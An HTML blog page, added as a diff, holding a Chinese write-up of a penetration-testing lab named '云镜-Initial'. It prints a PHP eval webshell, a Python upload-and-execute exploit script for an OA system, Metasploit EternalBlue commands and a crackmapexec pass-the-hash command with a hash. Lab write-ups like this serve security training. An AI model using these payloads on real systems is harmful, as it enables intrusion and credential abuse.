@@ -1,0 +1,521 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>云镜-Initial - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="云镜-Initial" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/initial/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-03-18T00:02:15+08:00" />
+<meta property="article:modified_time" content="2025-03-18T00:02:15+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="云镜-Initial"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/initial/" /><link rel="prev" href="http://ML-hacker.github.io/posts/trx-ctf-writeups/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "云镜-Initial",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/initial/"
+        },"genre": "posts","keywords": "WEB, sudo提权, initial, PTH, DCSync","wordcount":  213 ,
+        "url": "http://ML-hacker.github.io/posts/initial/","datePublished": "2025-03-18T00:02:15+08:00","dateModified": "2025-03-18T00:02:15+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">云镜-Initial</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/%E4%BA%91%E9%95%9C/"><i class="far fa-folder fa-fw"></i>云镜</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-03-18">2025-03-18</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-03-18">2025-03-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;213 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="content" id="content"><p>进来是一个登陆页面
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/1.png"
+        srcset="/img/initial/1.png, /img/initial/1.png 1.5x, /img/initial/1.png 2x"
+        alt="/img/initial/1.png"
+        title="/img/initial/1.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/2.png"
+        srcset="/img/initial/2.png, /img/initial/2.png 1.5x, /img/initial/2.png 2x"
+        alt="/img/initial/2.png"
+        title="/img/initial/2.png" ></figure>
+注册不了账号指向了#，所以我们看看哪里能打
+fscan扫一下发现think5.0.23然后打rce
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/3.png"
+        srcset="/img/initial/3.png, /img/initial/3.png 1.5x, /img/initial/3.png 2x"
+        alt="/img/initial/3.png"
+        title="/img/initial/3.png" ></figure>
+然后尝试写一句话木马
+<code>echo '&lt;?php eval($_POST[cmd]); ?&gt;' &gt; shell.php</code>
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/4.png"
+        srcset="/img/initial/4.png, /img/initial/4.png 1.5x, /img/initial/4.png 2x"
+        alt="/img/initial/4.png"
+        title="/img/initial/4.png" ></figure>
+yj连一下
+然后sudo -l看一下有什么能用的
+这里再拓展一下sudo语法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo <span class="o">[</span>options<span class="o">]</span> <span class="o">[</span>command<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>-b</code>：在后台执行指令；</li>
+<li><code>-E</code>：继承当前环境变量；</li>
+<li><code>-h</code>：显示帮助；</li>
+<li><code>-H</code>：将 HOME 环境变量设为新身份的 HOME 环境变量；</li>
+<li><code>-k</code>：结束密码的有效期限，也就是下次再执行 <code>sudo</code> 时便需要输入密码；</li>
+<li><code>-l</code>：列出目前用户可执行与无法执行的指令；</li>
+<li><code>-p</code>：改变询问密码的提示符号；</li>
+<li><code>-s&lt;shell&gt;</code>：执行指定的 shell；</li>
+<li><code>-u&lt;user&gt;</code>：以指定的用户作为新的身份。若不加上此参数，则预设以 root 作为新的身份；</li>
+<li><code>-v</code>：延长密码有效期限 5 分钟；</li>
+<li><code>-V</code>：显示版本信息。</li>
+</ul>
+<p><figure><img
+        
+        loading="lazy"
+        src="/img/initial/5.png"
+        srcset="/img/initial/5.png, /img/initial/5.png 1.5x, /img/initial/5.png 2x"
+        alt="/img/initial/5.png"
+        title="/img/initial/5.png" ></figure>
+发现有一个mysql，然后利用mysql提权
+这里的逻辑就是，看一下我们能用的哪一个命令有sudo权限，然后利用这个权限去打高权限
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/6.png"
+        srcset="/img/initial/6.png, /img/initial/6.png 1.5x, /img/initial/6.png 2x"
+        alt="/img/initial/6.png"
+        title="/img/initial/6.png" ></figure>
+关于<code>mysql -e</code>这个命令的解释
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/7.png"
+        srcset="/img/initial/7.png, /img/initial/7.png 1.5x, /img/initial/7.png 2x"
+        alt="/img/initial/7.png"
+        title="/img/initial/7.png" ></figure>
+所以我们先读文件，找一下flag在哪里
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/8.png"
+        srcset="/img/initial/8.png, /img/initial/8.png 1.5x, /img/initial/8.png 2x"
+        alt="/img/initial/8.png"
+        title="/img/initial/8.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/9.png"
+        srcset="/img/initial/9.png, /img/initial/9.png 1.5x, /img/initial/9.png 2x"
+        alt="/img/initial/9.png"
+        title="/img/initial/9.png" ></figure>
+拿下第一段
+<code>flag{60b53231-</code>
+然后接着打内网,传一个fscan上去
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/10.png"
+        srcset="/img/initial/10.png, /img/initial/10.png 1.5x, /img/initial/10.png 2x"
+        alt="/img/initial/10.png"
+        title="/img/initial/10.png" ></figure>
+记得给执行权限
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/11.png"
+        srcset="/img/initial/11.png, /img/initial/11.png 1.5x, /img/initial/11.png 2x"
+        alt="/img/initial/11.png"
+        title="/img/initial/11.png" ></figure>
+然后在内网的资源，所以我们需要建立一个内网隧道，这里用chisel
+安装:
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/12.png"
+        srcset="/img/initial/12.png, /img/initial/12.png 1.5x, /img/initial/12.png 2x"
+        alt="/img/initial/12.png"
+        title="/img/initial/12.png" ></figure>
+第一次用这个工具所以也要了解一下原理吧:
+<figure><img
+        
+        loading="lazy"
+        src="https://camo.githubusercontent.com/d250e1da1498830bc77ba11dcff241c1cc4ac4fcba9882df3259579ba9b439f7/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230"
+        srcset="https://camo.githubusercontent.com/d250e1da1498830bc77ba11dcff241c1cc4ac4fcba9882df3259579ba9b439f7/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230, https://camo.githubusercontent.com/d250e1da1498830bc77ba11dcff241c1cc4ac4fcba9882df3259579ba9b439f7/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230 1.5x, https://camo.githubusercontent.com/d250e1da1498830bc77ba11dcff241c1cc4ac4fcba9882df3259579ba9b439f7/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230 2x"
+        alt="https://camo.githubusercontent.com/d250e1da1498830bc77ba11dcff241c1cc4ac4fcba9882df3259579ba9b439f7/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230"
+        title="https://camo.githubusercontent.com/d250e1da1498830bc77ba11dcff241c1cc4ac4fcba9882df3259579ba9b439f7/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230" ></figure>
+建立了一个隧道并且利用ssh加密传输保证了安全性
+vps上reverse代理
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/13.png"
+        srcset="/img/initial/13.png, /img/initial/13.png 1.5x, /img/initial/13.png 2x"
+        alt="/img/initial/13.png"
+        title="/img/initial/13.png" ></figure>
+然后靶机上给一个正向
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/14.png"
+        srcset="/img/initial/14.png, /img/initial/14.png 1.5x, /img/initial/14.png 2x"
+        alt="/img/initial/14.png"
+        title="/img/initial/14.png" ></figure>
+最后配置一下火狐即可访问
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/15.png"
+        srcset="/img/initial/15.png, /img/initial/15.png 1.5x, /img/initial/15.png 2x"
+        alt="/img/initial/15.png"
+        title="/img/initial/15.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/16.png"
+        srcset="/img/initial/16.png, /img/initial/16.png 1.5x, /img/initial/16.png 2x"
+        alt="/img/initial/16.png"
+        title="/img/initial/16.png" ></figure>
+然后这里先配一下kali的proxychains因为后续要用到
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/17.png"
+        srcset="/img/initial/17.png, /img/initial/17.png 1.5x, /img/initial/17.png 2x"
+        alt="/img/initial/17.png"
+        title="/img/initial/17.png" ></figure>
+然后利用poc打后台（省略了前面弱口令部分，其实就一个base64加密爆破即可）
+exp.python</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url_pre</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.1.18/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url1</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url2</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url3</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data1</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;rempass&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;jmpass&#39;</span><span class="p">:</span> <span class="s1">&#39;false&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;device&#39;</span><span class="p">:</span> <span class="s1">&#39;1625884034525&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ltype&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminuser&#39;</span><span class="p">:</span> <span class="s1">&#39;YWRtaW4=&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminpass&#39;</span><span class="p">:</span> <span class="s1">&#39;YWRtaW4xMjM=&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;yanzm&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.php&#39;</span><span class="p">,</span> <span class="s1">&#39;r+&#39;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filepath</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;filepath&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">filepath</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">filepath</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.uptemp&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">url3</span> <span class="o">=</span> <span class="n">url_pre</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_pre</span> <span class="o">+</span> <span class="n">filepath</span> <span class="o">+</span> <span class="s2">&#34;?1=system(&#39;dir&#39;);&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/initial/18.png"
+        srcset="/img/initial/18.png, /img/initial/18.png 1.5x, /img/initial/18.png 2x"
+        alt="/img/initial/18.png"
+        title="/img/initial/18.png" ></figure>
+成功写入
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/19.png"
+        srcset="/img/initial/19.png, /img/initial/19.png 1.5x, /img/initial/19.png 2x"
+        alt="/img/initial/19.png"
+        title="/img/initial/19.png" ></figure>
+蚁剑连接一下（注意配一下代理）
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/20.png"
+        srcset="/img/initial/20.png, /img/initial/20.png 1.5x, /img/initial/20.png 2x"
+        alt="/img/initial/20.png"
+        title="/img/initial/20.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/21.png"
+        srcset="/img/initial/21.png, /img/initial/21.png 1.5x, /img/initial/21.png 2x"
+        alt="/img/initial/21.png"
+        title="/img/initial/21.png" ></figure>
+flag02:<code>2ce3-4813-87d4-</code></p>
+<p>然后还有一台机器
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/22.png"
+        srcset="/img/initial/22.png, /img/initial/22.png 1.5x, /img/initial/22.png 2x"
+        alt="/img/initial/22.png"
+        title="/img/initial/22.png" ></figure>
+这里fscan之前扫到过时ms17-101打的
+这里跟着猫and狗师傅用msf吧（当一会脚本小子！）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">proxychains4</span> <span class="n">msfconsole</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms17_010_eternalblue</span> 
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp_uuid</span> 
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">RHOSTS</span> <span class="mf">172.22</span><span class="o">.</span><span class="mf">1.21</span> 
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/initial/23.png"
+        srcset="/img/initial/23.png, /img/initial/23.png 1.5x, /img/initial/23.png 2x"
+        alt="/img/initial/23.png"
+        title="/img/initial/23.png" ></figure>
+拿下
+<figure><img
+        
+        loading="lazy"
+        src="/img/initial/24.png"
+        srcset="/img/initial/24.png, /img/initial/24.png 1.5x, /img/initial/24.png 2x"
+        alt="/img/initial/24.png"
+        title="/img/initial/24.png" ></figure>
+拿到hash后直接打就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="s2">&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考链接:
+<a href="https://fushuling.com/index.php/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7initial/" target="_blank" rel="noopener noreferrer">https://fushuling.com/index.php/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7initial/</a></p></div>
+
+        
+
+
+<h2>Related Content</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/trx-ctf-writeups/">TRX-CTF2025 复现</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">WEB</a>,&nbsp;<a href="/tags/sudo%E6%8F%90%E6%9D%83/">sudo提权</a>,&nbsp;<a href="/tags/initial/">initial</a>,&nbsp;<a href="/tags/pth/">PTH</a>,&nbsp;<a href="/tags/dcsync/">DCSync</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/trx-ctf-writeups/" class="prev" rel="prev" title="TRX-CTF2025 复现"><i class="fas fa-angle-left fa-fw"></i>TRX-CTF2025 复现</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
